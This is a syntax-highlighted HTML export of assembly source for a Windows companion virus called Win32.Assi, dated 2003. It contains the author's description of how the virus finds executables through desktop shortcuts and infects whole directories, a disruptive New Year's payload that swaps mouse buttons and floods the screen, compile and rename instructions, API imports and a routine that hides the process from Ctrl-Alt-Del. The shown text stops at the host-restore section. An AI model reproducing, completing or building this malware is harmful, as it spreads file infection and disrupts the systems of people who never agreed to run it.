<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; COMMENT#</span><span class="sc0">
</span><span class="sc1">; ____________________________________________________________________________________________</span><span class="sc0">
</span><span class="sc1">;                                       Win32.Assi</span><span class="sc0">
</span><span class="sc1">;                                 aka Win32.DesktopLover</span><span class="sc0">
</span><span class="sc1">;                                      Version  1.0</span><span class="sc0">
</span><span class="sc1">;                                   Another  Companion</span><span class="sc0">
</span><span class="sc1">;                                  coded by DiA (c)2oo3</span><span class="sc0">
</span><span class="sc1">;                             http://www.anzwers.net/free/dia</span><span class="sc0">
</span><span class="sc1">;                                        Germany</span><span class="sc0">
</span><span class="sc1">; ____________________________________________________________________________________________</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Intro:</span><span class="sc0">
</span><span class="sc1">;    OK, another Comapnion I coded! Must I rename my Nick in Mr.Companion? NO! I work</span><span class="sc0">
</span><span class="sc1">;    on a PE Appender, but it don't work very well, to many Bugs... But I work!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Disclaimer:</span><span class="sc0">
</span><span class="sc1">;    I am NOT responsible for any damage that you do! You can need the code however you want..</span><span class="sc0">
</span><span class="sc1">;    My motherlanguage is not English, I hope you understand what I mean.                      </span><span class="sc0">
</span><span class="sc1">;    Feel FREE to write any Comments to                                                        </span><span class="sc0">
</span><span class="sc1">;                                        DiA_hates_machine@gmx.de</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; What's NOT New:</span><span class="sc0">
</span><span class="sc1">;    -the infection routine</span><span class="sc0">
</span><span class="sc1">;    -the cd.. method</span><span class="sc0">
</span><span class="sc1">;    -the method to get Host's Name</span><span class="sc0">
</span><span class="sc1">;     AND WHAT'S FUCKIN NEW?!?</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; What's New:</span><span class="sc0">
</span><span class="sc1">;    -The Virus search in *.lnk Files for the Directory includes the *.exe file(s)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; How does it works:</span><span class="sc0">
</span><span class="sc1">;    -first get the Host's .SYS Name</span><span class="sc0">
</span><span class="sc1">;    -run Host</span><span class="sc0">
</span><span class="sc1">;    -it's a two way Virus</span><span class="sc0">
</span><span class="sc1">;    -check Date...</span><span class="sc0">
</span><span class="sc1">;    -if Date&lt;15th do LNK_Method</span><span class="sc0">
</span><span class="sc1">;    -if Date&gt;15th do CD_Method</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; LNK_Method:</span><span class="sc0">
</span><span class="sc1">;    -Get the Desktop Directory from the Registry</span><span class="sc0">
</span><span class="sc1">;    -Go to the Directory</span><span class="sc0">
</span><span class="sc1">;    -search for *.lnk files</span><span class="sc0">
</span><span class="sc1">;    -Read this *.lnk file</span><span class="sc0">
</span><span class="sc1">;    -scan to find the Directory included the *.exe</span><span class="sc0">
</span><span class="sc1">;    -Go to this Directory</span><span class="sc0">
</span><span class="sc1">;    -Infect all files</span><span class="sc0">
</span><span class="sc1">;    -Go back to the Desktop Folder</span><span class="sc0">
</span><span class="sc1">;    -if any Errors in this method do the CD_Method</span><span class="sc0">
</span><span class="sc1">;    -Find more *.lnk</span><span class="sc0">
</span><span class="sc1">;    -if No more *.lnk check for Payload Date</span><span class="sc0">
</span><span class="sc1">;    -if no Payload Date, exit Virus</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; CD_Method:</span><span class="sc0">
</span><span class="sc1">;    -see my Tut about cd.. Traveling</span><span class="sc0">
</span><span class="sc1">;    -infect current Directory</span><span class="sc0">
</span><span class="sc1">;    -cd..</span><span class="sc0">
</span><span class="sc1">;    -infect this Diretory</span><span class="sc0">
</span><span class="sc1">;    -C:\ --&gt; exit Virus</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Payload:</span><span class="sc0">
</span><span class="sc1">;    -on the 1. January</span><span class="sc0">
</span><span class="sc1">;    -first show a Message</span><span class="sc0">
</span><span class="sc1">;    -after that a DC Message follow the Mouse Cursor</span><span class="sc0">
</span><span class="sc1">;    -it Bombs the screen with the Message: "ASSI.DiA"</span><span class="sc0">
</span><span class="sc1">;    -Swap's the Mouse Buttons</span><span class="sc0">
</span><span class="sc1">;    -can't stop with CTRL-ALT-DEL</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Outro:</span><span class="sc0">
</span><span class="sc1">;    -T H E   O N E   A N D   R E A L   A S S i   ! ! !</span><span class="sc0">

</span><span class="sc5">First</span><span class="sc0"> </span><span class="sc5">Generation</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;-----FirstGen.asm--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">oTitle</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Win32.Assi - First Generation'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">oMsg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Win32.Assi aka Win32.DesktopLover'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'coded by DiA (c)03 [Germany]'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'THE ONE AND REAL ASSI'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">FirstGen</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oTitle</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oMsg</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">FirstGen</span><span class="sc0">
</span><span class="sc1">;-----FirstGen.asm-END----------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">To</span><span class="sc0"> </span><span class="sc5">Compile</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc4">-</span><span class="sc5">First</span><span class="sc0"> </span><span class="sc5">Generation</span><span class="sc0">
      </span><span class="sc5">TASM32</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">z</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">ml</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">m3</span><span class="sc0"> </span><span class="sc5">FirstGen</span><span class="sc4">,,</span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc5">TLINK32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">Tpe</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc10">c</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">aa</span><span class="sc0"> </span><span class="sc5">FirstGen</span><span class="sc4">,</span><span class="sc5">FirstGen</span><span class="sc4">,,</span><span class="sc0">
      </span><span class="sc5">rename</span><span class="sc0"> </span><span class="sc5">FirstGen.EXE</span><span class="sc0"> </span><span class="sc5">Assi.SYS</span><span class="sc0">

   </span><span class="sc4">-</span><span class="sc5">Win32.Assi</span><span class="sc0">
      </span><span class="sc5">TASM32</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">z</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">ml</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">m3</span><span class="sc0"> </span><span class="sc5">Assi</span><span class="sc4">,,</span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc5">TLINK32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">Tpe</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc10">c</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">aa</span><span class="sc0"> </span><span class="sc5">Assi</span><span class="sc4">,</span><span class="sc5">Assi</span><span class="sc4">,,</span><span class="sc0">

   </span><span class="sc4">-</span><span class="sc5">Assi.EXE</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">Assi.SYS</span><span class="sc0"> </span><span class="sc5">must</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">ONE</span><span class="sc0"> </span><span class="sc5">Directory</span><span class="sc0">

</span><span class="sc5">The</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc9">END</span><span class="sc0">
</span><span class="sc5">____________________________________________________________________________________________</span><span class="sc0">
                                      </span><span class="sc5">Win32.Assi</span><span class="sc0">
                                </span><span class="sc5">aka</span><span class="sc0"> </span><span class="sc5">Win32.DesktopLover</span><span class="sc0">
                                     </span><span class="sc5">Version</span><span class="sc0">  </span><span class="sc2">1.0</span><span class="sc0">
                                  </span><span class="sc5">Another</span><span class="sc0">  </span><span class="sc5">Companion</span><span class="sc0">
                                 </span><span class="sc5">coded</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">DiA</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">c</span><span class="sc4">)</span><span class="sc2">2oo3</span><span class="sc0">
                            </span><span class="sc5">http</span><span class="sc4">://</span><span class="sc5">www.anzwers.net</span><span class="sc4">/</span><span class="sc5">free</span><span class="sc4">/</span><span class="sc5">dia</span><span class="sc0">
                                       </span><span class="sc5">Germany</span><span class="sc0">
</span><span class="sc5">____________________________________________________________________________________________</span><span class="sc0">
#



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Head----------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Head-END------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----API's---------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCurrentProcessId</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegisterServiceProcess</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc0">           </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">              </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc0">          </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">           </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">              </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc0">              </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">           </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SwapMouseButton</span><span class="sc0">           </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateDCA</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">TextOutA</span><span class="sc0">              </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCursorPos</span><span class="sc0">          </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetTextColor</span><span class="sc0">          </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetBkMode</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">           </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">           </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----API's-END-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Data's--------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">.data?</span><span class="sc0">
</span><span class="sc5">FileBuffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Path</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">                       </span><span class="sc1">;here comes the datas</span><span class="sc0">
</span><span class="sc5">AssiFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">HostFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">ProcessInfo</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">StartupInfo</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">CurrentDir</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">CDdotdot</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">RegHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lpType</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">Size</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">100d</span><span class="sc0">
</span><span class="sc5">Desktop</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">SubKey</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Value</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Desktop'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">LNKmask</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.lnk'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LNKfindhandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">LNKhandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ReadBuffer</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">EXEmask</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EXEfindhandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">DisplayDC</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DISPLAY'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DChandle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AssiDiA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ASSI.DiA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">oTitle</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Win32.Assi aka Win32.DesktopLover'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">oMsg</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'              !THE ONE AND REAL ASSI!'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'              coded by DiA (c)2oo3 [GER]'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'           http://www.anzwers.net/free/dia'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'                     knock and have fun...'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SYSTEMTIME</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">wYear</span><span class="sc0">           </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wMonth</span><span class="sc0">              </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wDayOfWeek</span><span class="sc0">          </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wDay</span><span class="sc0">                </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wHour</span><span class="sc0">               </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wMinute</span><span class="sc0">             </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wSecond</span><span class="sc0">             </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wMilliseconds</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">FILETIME</span><span class="sc0">        </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">FT_dwLoeDateTime</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FT_dwHighDateTime</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FILETIME</span><span class="sc0">        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftCreationTime</span><span class="sc0">      </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastAccessTime</span><span class="sc0">    </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc0">     </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved0</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_szFileName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">260d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WFD_szAlternateFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">13</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WFD_szAlternateEnding</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">03</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">POINT</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0">           </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">y</span><span class="sc0">           </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Data's-END----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Hide Assi Process---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">Assi</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCurrentProcessId</span><span class="sc0">            </span><span class="sc1">;to hide the virus</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">;anti-ctrl-alt-del</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;id</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegisterServiceProcess</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Hide Assi Process-END-----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Restore HostName and run Host---------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
